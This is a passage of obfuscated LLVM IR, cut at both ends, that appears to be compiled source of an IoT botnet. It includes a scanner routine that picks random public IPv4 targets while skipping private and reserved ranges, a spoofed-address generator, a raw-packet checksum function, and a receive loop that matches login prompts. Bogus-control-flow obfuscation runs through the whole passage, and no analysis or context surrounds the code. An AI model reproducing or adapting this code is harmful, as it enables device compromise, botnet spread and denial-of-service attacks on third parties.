  %gen52 = mul i32 %_51, 1
  %_53 = sub i32 %374, 1
  %gen54 = mul i32 %_53, 1
  %375 = add nsw i32 %374, 1
  %376 = call i32 @select(i32 %375, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %377 = icmp slt i32 %376, 1
  br label %originalBB14

originalBB58alteredBB:                            ; preds = %originalBB58, %157
  %378 = load i8*, i8** %15, align 8
  %379 = load i32, i32* %18, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds i8, i8* %378, i64 %380
  store i8* %381, i8** %23, align 8
  %382 = load i32, i32* %10, align 4
  %383 = load i8*, i8** %23, align 8
  %384 = call i64 @recv(i32 %382, i8* %383, i64 1, i32 0)
  %385 = trunc i64 %384 to i32
  store i32 %385, i32* %19, align 4
  %386 = load i32, i32* %19, align 4
  %387 = icmp eq i32 %386, -1
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %204
  %388 = load i32, i32* %19, align 4
  %389 = icmp eq i32 %388, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %223
  store i32 0, i32* %9, align 4
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %248
  store i32 0, i32* %9, align 4
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %271
  %390 = load i32, i32* %12, align 4
  %391 = icmp ne i32 %390, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %290
  %392 = load i8*, i8** %15, align 8
  %393 = call i32 @matchPrompt(i8* %392)
  %394 = icmp ne i32 %393, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %310
  store i32 1, i32* %20, align 4
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %334
  %395 = load i32, i32* %9, align 4
  br label %originalBB86
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = load i32, i32* @x.51
  %2 = load i32, i32* @y.52
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [4 x i8], align 1
  %10 = alloca [16 x i8], align 16
  %11 = bitcast [4 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %11, i8 0, i64 4, i32 1, i1 false)
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  store i8 %18, i8* %19, align 1
  %20 = call i32 @rand() #2
  %21 = srem i32 %20, 255
  %22 = trunc i32 %21 to i8
  %23 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  store i8 %22, i8* %23, align 1
  %24 = call i32 @rand() #2
  %25 = srem i32 %24, 255
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 %26, i8* %27, align 1
  %28 = load i32, i32* @x.51
  %29 = load i32, i32* @y.52
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %36

; <label>:36:                                     ; preds = %311, %originalBBpart2
  %37 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %293, label %41

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* @x.51
  %43 = load i32, i32* @y.52
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %41
  %50 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 10
  %54 = load i32, i32* @x.51
  %55 = load i32, i32* @y.52
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %53, label %293, label %62

; <label>:62:                                     ; preds = %originalBBpart242
  %63 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 100
  br i1 %66, label %67, label %77

; <label>:67:                                     ; preds = %62
  %68 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp sge i32 %70, 64
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %67
  %73 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sle i32 %75, 127
  br i1 %76, label %293, label %77

; <label>:77:                                     ; preds = %72, %67, %62
  %78 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 127
  br i1 %81, label %293, label %82

; <label>:82:                                     ; preds = %77
  %83 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %84 = load i8, i8* %83, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 169
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %82
  %88 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 254
  br i1 %91, label %293, label %92

; <label>:92:                                     ; preds = %87, %82
  %93 = load i32, i32* @x.51
  %94 = load i32, i32* @y.52
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %92
  %101 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 172
  %105 = load i32, i32* @x.51
  %106 = load i32, i32* @y.52
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %104, label %113, label %139

; <label>:113:                                    ; preds = %originalBBpart246
  %114 = load i32, i32* @x.51
  %115 = load i32, i32* @y.52
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %113
  %122 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %123 = load i8, i8* %122, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp sle i32 %124, 16
  %126 = load i32, i32* @x.51
  %127 = load i32, i32* @y.52
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %125, label %134, label %139

; <label>:134:                                    ; preds = %originalBBpart250
  %135 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp sle i32 %137, 31
  br i1 %138, label %293, label %139

; <label>:139:                                    ; preds = %134, %originalBBpart250, %originalBBpart246
  %140 = load i32, i32* @x.51
  %141 = load i32, i32* @y.52
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %139
  %148 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %149 = load i8, i8* %148, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 192
  %152 = load i32, i32* @x.51
  %153 = load i32, i32* @y.52
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %151, label %160, label %186

; <label>:160:                                    ; preds = %originalBBpart254
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 0
  br i1 %164, label %165, label %186

; <label>:165:                                    ; preds = %160
  %166 = load i32, i32* @x.51
  %167 = load i32, i32* @y.52
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %165
  %174 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %175 = load i8, i8* %174, align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 2
  %178 = load i32, i32* @x.51
  %179 = load i32, i32* @y.52
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %177, label %293, label %186

; <label>:186:                                    ; preds = %originalBBpart258, %160, %originalBBpart254
  %187 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 192
  br i1 %190, label %191, label %201

; <label>:191:                                    ; preds = %186
  %192 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 88
  br i1 %195, label %196, label %201

; <label>:196:                                    ; preds = %191
  %197 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 99
  br i1 %200, label %293, label %201

; <label>:201:                                    ; preds = %196, %191, %186
  %202 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 192
  br i1 %205, label %206, label %211

; <label>:206:                                    ; preds = %201
  %207 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 168
  br i1 %210, label %293, label %211

; <label>:211:                                    ; preds = %206, %201
  %212 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %213 = load i8, i8* %212, align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 198
  br i1 %215, label %216, label %226

; <label>:216:                                    ; preds = %211
  %217 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 18
  br i1 %220, label %293, label %221

; <label>:221:                                    ; preds = %216
  %222 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 19
  br i1 %225, label %293, label %226

; <label>:226:                                    ; preds = %221, %211
  %227 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 198
  br i1 %230, label %231, label %257

; <label>:231:                                    ; preds = %226
  %232 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 51
  br i1 %235, label %236, label %257

; <label>:236:                                    ; preds = %231
  %237 = load i32, i32* @x.51
  %238 = load i32, i32* @y.52
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %236
  %245 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 100
  %249 = load i32, i32* @x.51
  %250 = load i32, i32* @y.52
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %248, label %293, label %257

; <label>:257:                                    ; preds = %originalBBpart262, %231, %226
  %258 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 203
  br i1 %261, label %262, label %288

; <label>:262:                                    ; preds = %257
  %263 = load i32, i32* @x.51
  %264 = load i32, i32* @y.52
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %262
  %271 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %272 = load i8, i8* %271, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp eq i32 %273, 0
  %275 = load i32, i32* @x.51
  %276 = load i32, i32* @y.52
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %274, label %283, label %288

; <label>:283:                                    ; preds = %originalBBpart266
  %284 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %285 = load i8, i8* %284, align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 113
  br i1 %287, label %293, label %288

; <label>:288:                                    ; preds = %283, %originalBBpart266, %257
  %289 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = icmp sge i32 %291, 224
  br label %293

; <label>:293:                                    ; preds = %288, %283, %originalBBpart262, %221, %216, %206, %196, %originalBBpart258, %134, %87, %77, %72, %originalBBpart242, %36
  %294 = phi i1 [ true, %283 ], [ true, %originalBBpart262 ], [ true, %221 ], [ true, %216 ], [ true, %206 ], [ true, %196 ], [ true, %originalBBpart258 ], [ true, %134 ], [ true, %87 ], [ true, %77 ], [ true, %72 ], [ true, %originalBBpart242 ], [ true, %36 ], [ %292, %288 ]
  %295 = load i32, i32* @x.51
  %296 = load i32, i32* @y.52
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %293
  %303 = load i32, i32* @x.51
  %304 = load i32, i32* @y.52
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %294, label %311, label %328

; <label>:311:                                    ; preds = %originalBBpart270
  %312 = call i32 @rand() #2
  %313 = srem i32 %312, 255
  %314 = trunc i32 %313 to i8
  %315 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  store i8 %314, i8* %315, align 1
  %316 = call i32 @rand() #2
  %317 = srem i32 %316, 255
  %318 = trunc i32 %317 to i8
  %319 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  store i8 %318, i8* %319, align 1
  %320 = call i32 @rand() #2
  %321 = srem i32 %320, 255
  %322 = trunc i32 %321 to i8
  %323 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  store i8 %322, i8* %323, align 1
  %324 = call i32 @rand() #2
  %325 = srem i32 %324, 255
  %326 = trunc i32 %325 to i8
  %327 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 %326, i8* %327, align 1
  br label %36

; <label>:328:                                    ; preds = %originalBBpart270
  %329 = load i32, i32* @x.51
  %330 = load i32, i32* @y.52
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %328
  %337 = bitcast [16 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %337, i8 0, i64 16, i32 16, i1 false)
  %338 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %339 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %340 = load i8, i8* %339, align 1
  %341 = zext i8 %340 to i32
  %342 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %343 = load i8, i8* %342, align 1
  %344 = zext i8 %343 to i32
  %345 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %346 = load i8, i8* %345, align 1
  %347 = zext i8 %346 to i32
  %348 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %349 = load i8, i8* %348, align 1
  %350 = zext i8 %349 to i32
  %351 = call i32 (i8*, i8*, ...) @szprintf(i8* %338, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i32 %341, i32 %344, i32 %347, i32 %350)
  %352 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %353 = call i32 @inet_addr(i8* %352) #2
  %354 = load i32, i32* @x.51
  %355 = load i32, i32* @y.52
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  ret i32 %353

originalBBalteredBB:                              ; preds = %originalBB, %0
  %362 = alloca [4 x i8], align 1
  %363 = alloca [16 x i8], align 16
  %364 = bitcast [4 x i8]* %362 to i8*
  call void @llvm.memset.p0i8.i64(i8* %364, i8 0, i64 4, i32 1, i1 false)
  %365 = call i32 @rand() #2
  %_ = shl i32 %365, 255
  %_1 = sub i32 0, %365
  %gen = add i32 %_1, 255
  %_2 = sub i32 %365, 255
  %gen3 = mul i32 %_2, 255
  %_4 = sub i32 %365, 255
  %gen5 = mul i32 %_4, 255
  %_6 = sub i32 %365, 255
  %gen7 = mul i32 %_6, 255
  %_8 = sub i32 0, %365
  %gen9 = add i32 %_8, 255
  %_10 = shl i32 %365, 255
  %_11 = sub i32 %365, 255
  %gen12 = mul i32 %_11, 255
  %_13 = sub i32 0, %365
  %gen14 = add i32 %_13, 255
  %366 = srem i32 %365, 255
  %367 = trunc i32 %366 to i8
  %368 = getelementptr inbounds [4 x i8], [4 x i8]* %362, i64 0, i64 0
  store i8 %367, i8* %368, align 1
  %369 = call i32 @rand() #2
  %_15 = sub i32 %369, 255
  %gen16 = mul i32 %_15, 255
  %_17 = shl i32 %369, 255
  %370 = srem i32 %369, 255
  %371 = trunc i32 %370 to i8
  %372 = getelementptr inbounds [4 x i8], [4 x i8]* %362, i64 0, i64 1
  store i8 %371, i8* %372, align 1
  %373 = call i32 @rand() #2
  %_18 = shl i32 %373, 255
  %_19 = sub i32 %373, 255
  %gen20 = mul i32 %_19, 255
  %_21 = shl i32 %373, 255
  %_22 = sub i32 0, %373
  %gen23 = add i32 %_22, 255
  %_24 = sub i32 %373, 255
  %gen25 = mul i32 %_24, 255
  %_26 = sub i32 %373, 255
  %gen27 = mul i32 %_26, 255
  %_28 = sub i32 %373, 255
  %gen29 = mul i32 %_28, 255
  %374 = srem i32 %373, 255
  %375 = trunc i32 %374 to i8
  %376 = getelementptr inbounds [4 x i8], [4 x i8]* %362, i64 0, i64 2
  store i8 %375, i8* %376, align 1
  %377 = call i32 @rand() #2
  %_30 = sub i32 %377, 255
  %gen31 = mul i32 %_30, 255
  %_32 = sub i32 0, %377
  %gen33 = add i32 %_32, 255
  %_34 = sub i32 0, %377
  %gen35 = add i32 %_34, 255
  %_36 = sub i32 %377, 255
  %gen37 = mul i32 %_36, 255
  %_38 = sub i32 0, %377
  %gen39 = add i32 %_38, 255
  %378 = srem i32 %377, 255
  %379 = trunc i32 %378 to i8
  %380 = getelementptr inbounds [4 x i8], [4 x i8]* %362, i64 0, i64 3
  store i8 %379, i8* %380, align 1
  br label %originalBB

originalBB40alteredBB:                            ; preds = %originalBB40, %41
  %381 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %382 = load i8, i8* %381, align 1
  %383 = zext i8 %382 to i32
  %384 = icmp eq i32 %383, 10
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %92
  %385 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %386 = load i8, i8* %385, align 1
  %387 = zext i8 %386 to i32
  %388 = icmp eq i32 %387, 172
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %113
  %389 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %390 = load i8, i8* %389, align 1
  %391 = zext i8 %390 to i32
  %392 = icmp sle i32 %391, 16
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %139
  %393 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %394 = load i8, i8* %393, align 1
  %395 = zext i8 %394 to i32
  %396 = icmp eq i32 %395, 192
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %165
  %397 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %398 = load i8, i8* %397, align 1
  %399 = zext i8 %398 to i32
  %400 = icmp eq i32 %399, 2
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %236
  %401 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %402 = load i8, i8* %401, align 1
  %403 = zext i8 %402 to i32
  %404 = icmp eq i32 %403, 100
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %262
  %405 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %406 = load i8, i8* %405, align 1
  %407 = zext i8 %406 to i32
  %408 = icmp eq i32 %407, 0
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %293
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %328
  %409 = bitcast [16 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %409, i8 0, i64 16, i32 16, i1 false)
  %410 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %411 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %412 = load i8, i8* %411, align 1
  %413 = zext i8 %412 to i32
  %414 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %415 = load i8, i8* %414, align 1
  %416 = zext i8 %415 to i32
  %417 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %418 = load i8, i8* %417, align 1
  %419 = zext i8 %418 to i32
  %420 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  %421 = load i8, i8* %420, align 1
  %422 = zext i8 %421 to i32
  %423 = call i32 (i8*, i8*, ...) @szprintf(i8* %410, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i32 %413, i32 %416, i32 %419, i32 %422)
  %424 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %425 = call i32 @inet_addr(i8* %424) #2
  br label %originalBB72
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.55
  %4 = load i32, i32* @y.56
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.55
  %15 = load i32, i32* @y.56
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %originalBBpart215, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %50

; <label>:25:                                     ; preds = %22
  %26 = load i32, i32* @x.55
  %27 = load i32, i32* @y.56
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i16*, i16** %11, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %11, align 8
  %36 = load i16, i16* %34, align 2
  %37 = zext i16 %36 to i64
  %38 = load i64, i64* %13, align 8
  %39 = add i64 %38, %37
  store i64 %39, i64* %13, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sub nsw i32 %40, 2
  store i32 %41, i32* %12, align 4
  %42 = load i32, i32* @x.55
  %43 = load i32, i32* @y.56
  %44 = sub i32 %42, 1
